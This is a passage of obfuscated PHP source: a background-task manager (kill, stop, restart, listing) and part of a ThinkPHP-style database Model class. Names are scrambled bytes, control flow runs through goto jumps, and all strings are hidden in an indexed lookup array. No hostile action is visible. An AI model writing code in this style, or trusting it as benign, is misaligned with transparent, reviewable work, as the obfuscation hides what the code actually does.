$E§Ã¸ëéÃó[$D·ŒÙ‘³[973]] = $E§Ã¸ëéÃó[$D·ŒÙ‘³[987]]; } $E©ß‘†Á­ = timeFloat() - $E§Ã¸ëéÃó[$D·ŒÙ‘³[1440]] - $E§Ã¸ëéÃó[$D·ŒÙ‘³[1443]]; $E§Ã¸ëéÃó[$D·ŒÙ‘³[1438]] = $E§Ã¸ëéÃó[$D·ŒÙ‘³[987]] / $E§Ã¸ëéÃó[$D·ŒÙ‘³[973]]; $E§Ã¸ëéÃó[$D·ŒÙ‘³[1439]] = $E§Ã¸ëéÃó[$D·ŒÙ‘³[987]] / $E©ß‘†Á­; if ($E§Ã¸ëéÃó[$D·ŒÙ‘³[1438]] > 0) { $E§Ã¸ëéÃó[$D·ŒÙ‘³[1444]] = $E©ß‘†Á­ * (1 - $E§Ã¸ëéÃó[$D·ŒÙ‘³[1438]]) / $E§Ã¸ëéÃó[$D·ŒÙ‘³[1438]]; } $E§Ã¸ëéÃó[$D·ŒÙ‘³[1444]] = $E§Ã¸ëéÃó[$D·ŒÙ‘³[1444]] <= 0 ? 0 : $E§Ã¸ëéÃó[$D·ŒÙ‘³[1444]]; } goto c¥…„ùÈÉ; c”Ášë‹¼ğ: Hook::trigger($D·ŒÙ‘³[1455], $E§Ã¸ëéÃó); self::valueSet($E§Ã¸ëéÃó[$D·ŒÙ‘³[367]], $E§Ã¸ëéÃó); goto a¯ˆ¿Àä‰”; a¯ˆ¿Àä‰”: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Bß¶‚‚ø°) { $d‰‚¹»¦Çˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Cache::set($d‰‚¹»¦Çˆ[1454] . $this->task[$d‰‚¹»¦Çˆ[367]], $Bß¶‚‚ø°, 60); return $Bß¶‚‚ø°; } public static function get($C›‰Û²º) { return self::valueGet($C›‰Û²º); } public static function listData() { $bµÑö—œÑß = self::valueGet(); return array_sort_by($bµÑö—œÑß, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1440], !0); } public static function kill($d‚¾¶°Ç) { return self::changeStatus($d‚¾¶°Ç, self::STATYS_KILL); } public static function stop($C¤„ğééãØ) { return self::changeStatus($C¤„ğééãØ, self::STATYS_STOP); } public static function restart($d‰ß¦˜¾µ) { return self::changeStatus($d‰ß¦˜¾µ, self::STATYS_RUNNING); } public static function killAll() { $cáñæí«Óº =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÚ£™Ì×Ë‡ = self::listData(); foreach ($FÚ£™Ì×Ë‡ as $DâÔÊ «îª) { self::kill($DâÔÊ «îª[$cáñæí«Óº[367]]); } sleep(2); foreach ($FÚ£™Ì×Ë‡ as $DâÔÊ «îª) { self::valueSet($DâÔÊ «îª[$cáñæí«Óº[367]], !1); } } private static function changeStatus($CÜ÷ªŒ²šÑ, $aí§ßÜ·‹Î) { goto A àİÊÔÏ³; F‘“¤ßâ ‡: $DÍ†¤à÷ÅÜ[$F±—œó¹–[683]] = $aí§ßÜ·‹Î; self::valueSet($CÜ÷ªŒ²šÑ, $DÍ†¤à÷ÅÜ); self::log($F±—œó¹–[1456] . $DÍ†¤à÷ÅÜ[$F±—œó¹–[367]] . $F±—œó¹–[1457] . $aí§ßÜ·‹Î); goto eÑÂÖÑ°ğ¯; eÑÂÖÑ°ğ¯: return !0; goto aÂùã­³‡–; A àİÊÔÏ³: $F±—œó¹– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DÍ†¤à÷ÅÜ = self::valueGet($CÜ÷ªŒ²šÑ); if (!$DÍ†¤à÷ÅÜ) { return !1; } goto F‘“¤ßâ ‡; aÂùã­³‡–: } public static function valueGet($CÎŞĞÈêï = false) { $fÜĞ“é…Ü± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($CÎŞĞÈêï) { $FÔ¥Ë»„à³ = Model($fÜĞ“é…Ü±[399])->where(array($fÜĞ“é…Ü±[89] => $CÎŞĞÈêï, $fÜĞ“é…Ü±[29] => $fÜĞ“é…Ü±[1458]))->find(); return $FÔ¥Ë»„à³ ? json_decode($FÔ¥Ë»„à³[$fÜĞ“é…Ü±[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($A·Œ„¨ŞíÌ = false) { goto BëÍùÆ„‚É; E‚É»Ë½­×: $eĞğ¦ŞÒ¯ = Model($Bç¾ÂŒ¥®[399])->where($DÇ…á×ÀèÌ)->select(); $eĞğ¦ŞÒ¯ = $eĞğ¦ŞÒ¯ ? $eĞğ¦ŞÒ¯ : array(); foreach ($eĞğ¦ŞÒ¯ as $Aá¢ÅáóÄÜ => $f¬Œµ¡½Ò) { $eĞğ¦ŞÒ¯[$Aá¢ÅáóÄÜ] = json_decode($f¬Œµ¡½Ò[$Bç¾ÂŒ¥®[359]], !0); } goto e‘êã¿±Ø; e‘êã¿±Ø: return $eĞğ¦ŞÒ¯; goto BÒÔ¢ÖËµ¡; BëÍùÆ„‚É: $Bç¾ÂŒ¥® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DÇ…á×ÀèÌ = array($Bç¾ÂŒ¥®[29] => $Bç¾ÂŒ¥®[1458]); if ($A·Œ„¨ŞíÌ) { $DÇ…á×ÀèÌ[$Bç¾ÂŒ¥®[1437]] = $A·Œ„¨ŞíÌ; } goto E‚É»Ë½­×; BÒÔ¢ÖËµ¡: } public static function valueSet($CïÍÅàĞÒ‰, $Eë®Ô°šÄµ) { goto d‹Ï£Õ–ëŸ; D°Õ×³—’¹: Model($fíŠÆ‹–¾[399])->add($AÅ‰Î²™Œ, array(), !0); goto AÈ¢›¤áÒ; d‹Ï£Õ–ëŸ: $fíŠÆ‹–¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$Eë®Ô°šÄµ) { return Model($fíŠÆ‹–¾[399])->where(array($fíŠÆ‹–¾[89] => $CïÍÅàĞÒ‰, $fíŠÆ‹–¾[29] => $fíŠÆ‹–¾[1458]))->delete(); } $CèÇ¼è¿‘ = json_encode($Eë®Ô°šÄµ); goto fâåãºœ‚¬; fâåãºœ‚¬: if (!$CèÇ¼è¿‘) { ob_start(); var_dump($Eë®Ô°šÄµ); $Eø‹ê½ŞÏ = ob_get_clean(); self::log($fíŠÆ‹–¾[1459] . json_encode_force($Eø‹ê½ŞÏ)); } if (!$CïÍÅàĞÒ‰ || !$Eë®Ô°šÄµ[$fíŠÆ‹–¾[367]]) { return !1; } $AÅ‰Î²™Œ = array($fíŠÆ‹–¾[29] => $fíŠÆ‹–¾[1458], $fíŠÆ‹–¾[1437] => USER_ID, $fíŠÆ‹–¾[89] => $CïÍÅàĞÒ‰, $fíŠÆ‹–¾[359] => $CèÇ¼è¿‘); goto D°Õ×³—’¹; AÈ¢›¤áÒ: } public static function log($f‚òÅõ¼ã) { write_log($f‚òÅõ¼ã, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1460]); } } goto e‹Êç¹Ó·À; aƒÃß¢äŠ“: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][230], 0); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\x6f\162\x64\145\x72", "\x61\x6c\151\141\x73", "\x68\x61\x76\151\156\x67", "\x67\x72\157\165\160", "\x6c\157\x63\153", "\144\x69\163\x74\151\156\143\164", "\x61\165\x74\157", "\x66\151\154\164\145\162", "\x76\141\x6c\x69\x64\141\164\x65", "\162\145\x73\165\x6c\164", "\x62\151\x6e\144", "\164\157\x6b\x65\156"); public function __construct($cã‚Ò÷ô‘ = '', $e÷à®îå’ = '', $EŠª‚á Õ = '') { $FæêÑ¸ğø‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->_initialize(); if (!empty($cã‚Ò÷ô‘)) { if (strpos($cã‚Ò÷ô‘, $FæêÑ¸ğø‚[91])) { list($this->dbName, $this->name) = explode($FæêÑ¸ğø‚[91], $cã‚Ò÷ô‘); } else { $this->name = $cã‚Ò÷ô‘; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($e÷à®îå’)) { $this->tablePrefix = $FæêÑ¸ğø‚[33]; } elseif ($FæêÑ¸ğø‚[33] != $e÷à®îå’) { $this->tablePrefix = $e÷à®îå’; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($FæêÑ¸ğø‚[232]); } $this->db(0, empty($this->connection) ? $EŠª‚á Õ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EŸÂÕŞ×ˆÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($this->fields)) { if (think_config($EŸÂÕŞ×ˆÙ[233])) { $B¤éì±Æ¶ = $this->dbName ? $this->dbName : think_config($EŸÂÕŞ×ˆÙ[234]); $a¤©ĞÙ…†Ê = think_var_cache($EŸÂÕŞ×ˆÙ[235] . strtolower(get_path_this($B¤éì±Æ¶) . $EŸÂÕŞ×ˆÙ[91] . $this->name)); if ($a¤©ĞÙ…†Ê) { $c®šãŠÅçç = think_config($EŸÂÕŞ×ˆÙ[236]); if (empty($c®šãŠÅçç) || $a¤©ĞÙ…†Ê[$EŸÂÕŞ×ˆÙ[237]] == $c®šãŠÅçç) { $this->fields = $a¤©ĞÙ…†Ê; return; } } } $this->flush(); } } public function flush() { goto B‹‡†ßŒ‚; Aî¸“õÙ¬Š: if (think_config($bñ©­ßÇ´¥[233])) { $E˜ÂòÖ¤õ• = $this->dbName ? $this->dbName : think_config($bñ©­ßÇ´¥[234]); think_var_cache($bñ©­ßÇ´¥[235] . strtolower(get_path_this($E˜ÂòÖ¤õ•) . $bñ©­ßÇ´¥[91] . $this->name), $this->fields); } goto CÇ—Åš„’; f„øë¬ßÈ°: if (!$B£Ç…îÜÀ) { return !1; } $this->fields = array_keys($B£Ç…îÜÀ); $this->fields[$bñ©­ßÇ´¥[238]] = !1; goto F›µÓá×àÆ; B‹‡†ßŒ‚: $bñ©­ßÇ´¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->db->setModel($this->name); $B£Ç…îÜÀ = $this->db->getFields($this->getTableName()); goto f„øë¬ßÈ°; F›µÓá×àÆ: foreach ($B£Ç…îÜÀ as $Dİæµ…ª« => $cİğë³çæ) { $D²ƒ¢Ö¡Ç[$Dİæµ…ª«] = $cİğë³çæ[$bñ©­ßÇ´¥[29]]; if ($cİğë³çæ[$bñ©­ßÇ´¥[36]]) { $this->fields[$bñ©­ßÇ´¥[239]] = $Dİæµ…ª«; if ($cİğë³çæ[$bñ©­ßÇ´¥[39]]) { $this->fields[$bñ©­ßÇ´¥[238]] = !0; } } } $this->fields[$bñ©­ßÇ´¥[240]] = $D²ƒ¢Ö¡Ç; if (think_config($bñ©­ßÇ´¥[236])) { $this->fields[$bñ©­ßÇ´¥[237]] = think_config($bñ©­ßÇ´¥[236]); } goto Aî¸“õÙ¬Š; CÇ—Åš„’: } public function switchModel($Ağ¹Àİ¾ºÙ, $EÜå¿ˆÍØ´ = array()) { $cğÚ¢Ê«ƒÇ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fâ¶ê¿Œ‡ç = ucwords(strtolower($Ağ¹Àİ¾ºÙ)) . $cğÚ¢Ê«ƒÇ[241]; if (!class_exists($Fâ¶ê¿Œ‡ç)) { think_exception($Fâ¶ê¿Œ‡ç . think_lang($cğÚ¢Ê«ƒÇ[242])); } $this->_extModel = new $Fâ¶ê¿Œ‡ç($this->name); if (!empty($EÜå¿ˆÍØ´)) { foreach ($EÜå¿ˆÍØ´ as $E›ˆ‘îŠæ) { $this->_extModel->setProperty($E›ˆ‘îŠæ, $this->{$E›ˆ‘îŠæ}); } } return $this->_extModel; } public function __set($D³×å±’‚‡, $F¿½ÇğŠ”œ) { $this->data[$D³×å±’‚‡] = $F¿½ÇğŠ”œ; } public function __get($CÚ‹á°­µØ) { return isset($this->data[$CÚ‹á°­µØ]) ? $this->data[$CÚ‹á°­µØ] : null; } public function __isset($DÉæºîÊ’—) { return isset($this->data[$DÉæºîÊ’—]); } public function __unset($E º¯ÌËŠä) { unset($this->data[$E º¯ÌËŠä]); } public function __call($F›¹‡¿ÔÎ, $AçÂÙ’‰”£) { $aÚÒ‚Œµ† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (in_array(strtolower($F›¹‡¿ÔÎ), $this->methods, !0)) { $this->options[strtolower($F›¹‡¿ÔÎ)] = $AçÂÙ’‰”£[0]; return $this; } elseif (in_array(strtolower($F›¹‡¿ÔÎ), array($aÚÒ‚Œµ†[243], $aÚÒ‚Œµ†[244], $aÚÒ‚Œµ†[245], $aÚÒ‚Œµ†[246], $aÚÒ‚Œµ†[247]), !0)) { $bŒ¯¡ÀáÏ = isset($AçÂÙ’‰”£[0]) ? $AçÂÙ’‰”£[0] : $aÚÒ‚Œµ†[176]; $bŒ¯¡ÀáÏ = $this->db->parseKey($bŒ¯¡ÀáÏ); return $this->getField(strtoupper($F›¹‡¿ÔÎ) . $aÚÒ‚Œµ†[248] . $bŒ¯¡ÀáÏ . $aÚÒ‚Œµ†[249] . $F›¹‡¿ÔÎ, $aÚÒ‚Œµ†[243]); } elseif (strtolower(substr($F›¹‡¿ÔÎ, 0, 5)) == $aÚÒ‚Œµ†[250]) { $bŒ¯¡ÀáÏ = think_parse_name(substr($F›¹‡¿ÔÎ, 5)); $a–»ì­ç´õ[$bŒ¯¡ÀáÏ] = $AçÂÙ’‰”£[0]; return $this->where($a–»ì­ç´õ)->find(); } elseif (strtolower(substr($F›¹‡¿ÔÎ, 0, 10)) == $aÚÒ‚Œµ†[251]) { $Eìù™§®¼¸ = think_parse_name(substr($F›¹‡¿ÔÎ, 10)); $a–»ì­ç´õ[$Eìù™§®¼¸] = $AçÂÙ’‰”£[0]; return $this->where($a–»ì­ç´õ)->getField($AçÂÙ’‰”£[1]); } elseif (isset($this->_scope[$F›¹‡¿ÔÎ])) { return $this->scope($F›¹‡¿ÔÎ, $AçÂÙ’‰”£[0]); } elseif (method_exists($this, $F›¹‡¿ÔÎ)) { array_unshift($AçÂÙ’‰”£, $F›¹‡¿ÔÎ); return call_user_func_array(array($this, $aÚÒ‚Œµ†[252]), $AçÂÙ’‰”£); } else { return call_user_func_array(array(parent, $F›¹‡¿ÔÎ), $AçÂÙ’‰”£); } } protected function call() { goto c½ê·í Ãğ; céàÜ¯ºØ: $c×”˜á = $eñ¾ÔÓÛÇ; if (is_array($eñ¾ÔÓÛÇ)) { $c×”˜á = $eñ¾ÔÓÛÇ[1]; $eñ¾ÔÓÛÇ = $eñ¾ÔÓÛÇ[0]; } $c±¤Ùä”ê = count($CôòÕƒïÓÎ) - 1; goto Eç¸¿¬Ó; Eç¸¿¬Ó: if (isset($CôòÕƒïÓÎ[$c±¤Ùä”ê]) && $CôòÕƒïÓÎ[$c±¤Ùä”ê] === $eñ¾ÔÓÛÇ) { think_exception(__CLASS__ . $f©»»Õ¥³[4] . $eñ¾ÔÓÛÇ . think_lang($f©»»Õ¥³[253])); return; } $CôòÕƒïÓÎ[] = $eñ¾ÔÓÛÇ; if (method_exists($this, $f©»»Õ¥³[254])) { $B±¥äÄááô = call_user_func_array(array($this, $f©»»Õ¥³[255]), array($c×”˜á, $CôòÕƒïÓÎ)); if (!is_null($B±¥äÄááô) && $B±¥äÄááô !== !1) { return $B±¥äÄááô; } } goto A‘²Š¹ÖÃ‚; A‘²Š¹ÖÃ‚: $DÚÖÕ¾‹°„ = call_user_func_array(array($this, $eñ¾ÔÓÛÇ), $CôòÕƒïÓÎ); if (method_exists($this, $f©»»Õ¥³[256])) { $B±¥äÄááô = call_user_func_array(array($this, $f©»»Õ¥³[257]), array($c×”˜á, $CôòÕƒïÓÎ, $DÚÖÕ¾‹°„)); if ($B±¥äÄááô) { return $B±¥äÄááô; } } return $DÚÖÕ¾‹°„; goto aôä¶¦éÉ; c½ê·í Ãğ: $f©»»Õ¥³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CôòÕƒïÓÎ = func_get_args(); $eñ¾ÔÓÛÇ = array_shift($CôòÕƒïÓÎ); goto céàÜ¯ºØ; aôä¶¦éÉ: } protected function _initialize() { } protected function _facade($F‰›Ñ¡‡ƒ) { $Fò´†«´µ› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($this->fields)) { foreach ($F‰›Ñ¡‡ƒ as $f›Î¬ˆ‰ëÇ => $a£¼ó‰Ëâ) { if (!in_array($f›Î¬ˆ‰ëÇ, $this->fields, !0)) { unset($F‰›Ñ¡‡ƒ[$f›Î¬ˆ‰ëÇ]); } elseif (is_scalar($a£¼ó‰Ëâ)) { $this->_parseType($F‰›Ñ¡‡ƒ, $f›Î¬ˆ‰ëÇ); } } } if (!empty($this->options[$Fò´†«´µ›[258]])) { $F‰›Ñ¡‡ƒ = array_map($this->options[$Fò´†«´µ›[258]], $F‰›Ñ¡‡ƒ); unset($this->options[$Fò´†«´µ›[258]]); } $this->_beforeWrite($F‰›Ñ¡‡ƒ); return $F‰›Ñ¡‡ƒ; } protected function _beforeWrite(&$fèôÆëàĞ) { } public function add($dîåËë¾ŠÜ = '', $D°ó„¤Ğ = array(), $CÇ±¾¤îØä = false) { goto DøøÙì—Ô; E‚Ò¦ÖÔ¥: if (!1 === $this->_beforeInsert($dîåËë¾ŠÜ, $D°ó„¤Ğ)) { return !1; } $e²Áé¬µƒ = $this->db->insert($dîåËë¾ŠÜ, $D°ó„¤Ğ, $CÇ±¾¤îØä); if (!1 !== $e²Áé¬µƒ) { $E‘¿à¥†¸‚ = $this->getLastInsID(); if ($E‘¿à¥†¸‚) { $dîåËë¾ŠÜ[$this->getPk()] = $E‘¿à¥†¸‚; $this->_after_insert($dîåËë¾ŠÜ, $D°ó„¤Ğ); return $E‘¿à¥†¸‚; } $this->_after_insert($dîåËë¾ŠÜ, $D°ó„¤Ğ); } goto E…Ğøíã…Ø; E…Ğøíã…Ø: return $e²Áé¬µƒ; goto Cè·Ò½¢²¢; DøøÙì—Ô: if (empty($dîåËë¾ŠÜ)) { if (!empty($this->data)) { $dîåËë¾ŠÜ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][259]); return !1; } } $D°ó„¤Ğ = $this->_parseOptions($D°ó„¤Ğ); $dîåËë¾ŠÜ = $this->_facade($dîåËë¾ŠÜ); goto E‚Ò¦ÖÔ¥; Cè·Ò½¢²¢: } protected function _beforeInsert(&$b¸í³ÄÉ®Õ, $FßîÕ×‹ª) { } protected function _after_insert($cÌ„Ëóê‡ë, $CîÙÀôôòñ) { } public function addAll($a­ÕìæÆ, $E…ÂËº© = array(), $dÆ¢Í›‚İ½ = false) { goto B’ŠŞñ¤œ; BÖµ´áµé: foreach ($a­ÕìæÆ as $D¸·–‰”õ¨ => $f¦œÀÜ„×ä) { $a­ÕìæÆ[$D¸·–‰”õ¨] = $this->_facade($f¦œÀÜ„×ä); } if (method_exists($this->db, $E¬ôÕÍì‰ï[260])) { $E‚îÄÂ³Ş = $this->db->insertAll($a­ÕìæÆ, $E…ÂËº©, $dÆ¢Í›‚İ½); } else { $this->startTrans(); foreach ($a­ÕìæÆ as $D¸·–‰”õ¨ => $f¦œÀÜ„×ä) { $E‚îÄÂ³Ş = $this->db->insert($f¦œÀÜ„×ä, $E…ÂËº©, $dÆ¢Í›‚İ½); } $this->commit(); } if (!1 !== $E‚îÄÂ³Ş) { $dñ¹ÂÛÌÑÉ = $this->getLastInsID(); if ($dñ¹ÂÛÌÑÉ) { return $dñ¹ÂÛÌÑÉ; } } goto E¶Ğâš¥¶ù; B’ŠŞñ¤œ: $E¬ôÕÍì‰ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($a­ÕìæÆ)) { $this->error = think_lang($E¬ôÕÍì‰ï[259]); return !1; } $E…ÂËº© = $this->_parseOptions($E…ÂËº©); goto BÖµ´áµé; E¶Ğâš¥¶ù: return $E‚îÄÂ³Ş; goto B—ùì†›¤; B—ùì†›¤: } public function selectAdd($F‡‘ö¯· = '', $C¤èÌåí = '', $bí§ìÖõÄ = array()) { $aš‡ĞÓÜÄë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bí§ìÖõÄ = $this->_parseOptions($bí§ìÖõÄ); if (!1 === ($cáæÂ—ËèŞ = $this->db->selectInsert($F‡‘ö¯· ? $F‡‘ö¯· : $bí§ìÖõÄ[$aš‡ĞÓÜÄë[261]], $C¤èÌåí ? $C¤èÌåí : $this->getTableName(), $bí§ìÖõÄ))) { $this->error = think_lang($aš‡ĞÓÜÄë[262]); return !1; } else { return $cáæÂ—ËèŞ; } } public function save($cµƒÂ¥ŸÛŒ = '', $A…Àæ‹Ÿ©Ğ = array()) { goto aÍÍâ—Õ¡ô; b‹„Æ¶Ìİå: $A…Àæ‹Ÿ©Ğ = $this->_parseOptions($A…Àæ‹Ÿ©Ğ); $f²Ù‚’“Å = $this->getPk(); if (!isset($A…Àæ‹Ÿ©Ğ[$F‡ÒÃİŒÄ[263]])) { if (isset($cµƒÂ¥ŸÛŒ[$f²Ù‚’“Å])) { $C˜Äƒ´ÍğÁ[$f²Ù‚’“Å] = $cµƒÂ¥ŸÛŒ[$f²Ù‚’“Å]; $A…Àæ‹Ÿ©Ğ[$F‡ÒÃİŒÄ[263]] = $C˜Äƒ´ÍğÁ; unset($cµƒÂ¥ŸÛŒ[$f²Ù‚’“Å]); } else { $this->error = think_lang($F‡ÒÃİŒÄ[262]); return !1; } } goto C¥Ç«„¬Àì; aòÊ‹Îöéº: if (!1 !== $cŞ¦©…Ç») { if (isset($eé¾ØŒî¸â)) { $cµƒÂ¥ŸÛŒ[$f²Ù‚’“Å] = $eé¾ØŒî¸â; } $this->_afterUpdate($cµƒÂ¥ŸÛŒ, $A…Àæ‹Ÿ©Ğ); } return $cŞ¦©…Ç»; goto a®ŒÖƒÀäğ; aÍÍâ—Õ¡ô: $F‡ÒÃİŒÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($cµƒÂ¥ŸÛŒ)) { if (!empty($this->data)) { $cµƒÂ¥ŸÛŒ = $this->data; $this->data = array(); } else { $this->error = think_lang($F‡ÒÃİŒÄ[259]); return !1; } } $cµƒÂ¥ŸÛŒ = $this->_facade($cµƒÂ¥ŸÛŒ); goto b‹„Æ¶Ìİå; C¥Ç«„¬Àì: if (is_array($A…Àæ‹Ÿ©Ğ[$F‡ÒÃİŒÄ[263]]) && isset($A…Àæ‹Ÿ©Ğ[$F‡ÒÃİŒÄ[263]][$f²Ù‚’“Å])) { $eé¾ØŒî¸â = $A…Àæ‹Ÿ©Ğ[$F‡ÒÃİŒÄ[263]][$f²Ù‚’“Å]; } if (!1 === $this->_beforeUpdate($cµƒÂ¥ŸÛŒ, $A…Àæ‹Ÿ©Ğ)) { return !1; } $cŞ¦©…Ç» = $this->db->update($cµƒÂ¥ŸÛŒ, $A…Àæ‹Ÿ©Ğ); goto aòÊ‹Îöéº; a®ŒÖƒÀäğ: } protected function _beforeUpdate(&$B¶¼ò‘ÛÚ«, $B½ø»èÊë£) { } protected function _afterUpdate($Eæ¾¥÷Ìæñ, $CŠŒß‚ˆ×) { } public function delete($Aê¼Ôİ½¤ç = array()) { goto cïîƒ†áä; bªŞÆÍØÙÌ: $f¥ñÌí¡Ì = $this->db->delete($Aê¼Ôİ½¤ç); if (!1 !== $f¥ñÌí¡Ì) { $aŒ£È¡â‘å = array(); if (isset($fôÉ¢®õÛ‘)) { $aŒ£È¡â‘å[$c¨¢ò”°µÍ] = $fôÉ¢®õÛ‘; } $this->_after_delete($aŒ£È¡â‘å, $Aê¼Ôİ½¤ç); } return $f¥ñÌí¡Ì; goto F»´‹šá¿; D×´¥»½µÓ: if (is_numeric($Aê¼Ôİ½¤ç) || is_string($Aê¼Ôİ½¤ç)) { if (strpos($Aê¼Ôİ½¤ç, $fƒŠòÉ·‰Ø[47])) { $F‹ƒå‡ŠğÉ[$c¨¢ò”°µÍ] = array($fƒŠòÉ·‰Ø[264], $Aê¼Ôİ½¤ç); } else { $F‹ƒå‡ŠğÉ[$c¨¢ò”°µÍ] = $Aê¼Ôİ½¤ç; } $this->options[$fƒŠòÉ·‰Ø[263]] = $F‹ƒå‡ŠğÉ; } $Aê¼Ôİ½¤ç = $this->_parseOptions(); if (is_array($Aê¼Ôİ½¤ç[$fƒŠòÉ·‰Ø[263]]) && isset($Aê¼Ôİ½¤ç[$fƒŠòÉ·‰Ø[263]][$c¨¢ò”°µÍ])) { $fôÉ¢®õÛ‘ = $Aê¼Ôİ½¤ç[$fƒŠòÉ·‰Ø[263]][$c¨¢ò”°µÍ]; } goto bªŞÆÍØÙÌ; cïîƒ†áä: $fƒŠòÉ·‰Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($Aê¼Ôİ½¤ç) && empty($this->options[$fƒŠòÉ·‰Ø[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $c¨¢ò”°µÍ = $this->getPk(); goto D×´¥»½µÓ; F»´‹šá¿: } protected function _after_delete($A½îô£ª¸, $C¤ÍŠ­²ºÖ) { } public function select($d©…„»¾¿ = array()) { goto C´î‹¬Û‰Ô; A‚©•­êºµ: $b‡ƒ¸·áÑ¨ = $this->db->select($d©…„»¾¿); if (!1 === $b‡ƒ¸·áÑ¨) { return !1; } if (empty($b‡ƒ¸·áÑ¨)) { return null; } goto D—°§öŸÎ¨; D—°§öŸÎ¨: $this->_afterSelect($b‡ƒ¸·áÑ¨, $d©…„»¾¿); return $b‡ƒ¸·áÑ¨; goto AÜˆáÁ¡¸; C´î‹¬Û‰Ô: $f‘–Ì¹ñÓî =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_string($d©…„»¾¿) || is_numeric($d©…„»¾¿)) { $d…¿ÌÀ‘ñÌ = $this->getPk(); if (strpos($d©…„»¾¿, $f‘–Ì¹ñÓî[47])) { $aôœÊˆÓ°ô[$d…¿ÌÀ‘ñÌ] = array($f‘–Ì¹ñÓî[264], $d©…„»¾¿); } else { $aôœÊˆÓ°ô[$d…¿ÌÀ‘ñÌ] = $d©…„»¾¿; } $this->options[$f‘–Ì¹ñÓî[263]] = $aôœÊˆÓ°ô; } elseif (!1 === $d©…„»¾¿) { $d©…„»¾¿ = $this->_parseOptions(); return $f‘–Ì¹ñÓî[265] . $this->db->buildSelectSql($d©…„»¾¿) . $f‘–Ì¹ñÓî[266]; } $d©…„»¾¿ = $this->_parseOptions(); goto A‚©•­êºµ; AÜˆáÁ¡¸: } protected function _afterSelect(&$fÆ„ËÉ¥¤, $b„¯ğ°ŠŒ‡) { } public function buildSql($DñøÈªÌ = array()) { $DãØèíÆÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DñøÈªÌ = $this->_parseOptions($DñøÈªÌ); return $DãØèíÆÀ[265] . $this->db->buildSelectSql($DñøÈªÌ) . $DãØèíÆÀ[266]; } public function optionsValue($Bßê„›çĞå = null) { if (is_null($Bßê„›çĞå)) { return $this->options; } elseif (is_array($Bßê„›çĞå)) { $this->options = array_merge($this->options, $Bßê„›çĞå); } } protected function _parseOptions($E³œ†—‹Âİ = array()) { goto E…ŸŒ¶ĞÜ¨; A¨¹äèÂ‡»: if (isset($E³œ†—‹Âİ[$EÙñÚ£…Î[263]]) && is_array($E³œ†—‹Âİ[$EÙñÚ£…Î[263]]) && !empty($B£•ËƒÕ­¢) && !isset($E³œ†—‹Âİ[$EÙñÚ£…Î[270]]) && !isset($E³œ†—‹Âİ[$EÙñÚ£…Î[267]])) { foreach ($E³œ†—‹Âİ[$EÙñÚ£…Î[263]] as $B›îÁ‚Ù³¿ => $bô ãŸ…) { $B›îÁ‚Ù³¿ = trim($B›îÁ‚Ù³¿); if (in_array($B›îÁ‚Ù³¿, $B£•ËƒÕ­¢, !0)) { if (is_scalar($bô ãŸ…)) { $this->_parseType($E³œ†—‹Âİ[$EÙñÚ£…Î[263]], $B›îÁ‚Ù³¿); } } elseif (!is_numeric($B›îÁ‚Ù³¿) && $EÙñÚ£…Î[70] != substr($B›îÁ‚Ù³¿, 0, 1) && !1 === strpos($B›îÁ‚Ù³¿, $EÙñÚ£…Î[91]) && !1 === strpos($B›îÁ‚Ù³¿, $EÙñÚ£…Î[248]) && !1 === strpos($B›îÁ‚Ù³¿, $EÙñÚ£…Î[271]) && !1 === strpos($B›îÁ‚Ù³¿, $EÙñÚ£…Î[272])) { unset($E³œ†—‹Âİ[$EÙñÚ£…Î[263]][$B›îÁ‚Ù³¿]); } } } $this->_options_filter($E³œ†—‹Âİ); return $E³œ†—‹Âİ; goto DîÜĞñ²„á; E…ŸŒ¶ĞÜ¨: $EÙñÚ£…Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($E³œ†—‹Âİ)) { $E³œ†—‹Âİ = array_merge($this->options, $E³œ†—‹Âİ); } $this->options = array(); goto Aª…ñö¥³; Aª…ñö¥³: if (!isset($E³œ†—‹Âİ[$EÙñÚ£…Î[267]])) { 